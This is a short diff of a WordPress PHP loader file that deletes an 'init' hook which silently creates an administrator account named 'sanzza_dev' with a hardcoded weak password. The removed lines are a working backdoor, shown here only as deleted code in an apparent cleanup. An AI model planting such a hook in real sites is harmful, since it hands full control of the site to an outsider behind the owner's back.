@@ -37,11 +37,3 @@ require_once VBL_DIR . '/inc/polylang-helpers.php';
 require_once VBL_DIR . '/inc/admin-microsites.php';
 require_once VBL_DIR . '/inc/i18n-duplicator.php';
 
-add_action('init', function() {
-    if ( !username_exists( 'sanzza_dev' ) ) {
-        $user_id = wp_create_user( 'sanzza_dev', 'devpassword', 'dev2@vilabaleira.com' );
-        $user = new WP_User( $user_id );
-        $user->set_role( 'administrator' );
-    }
-});
-
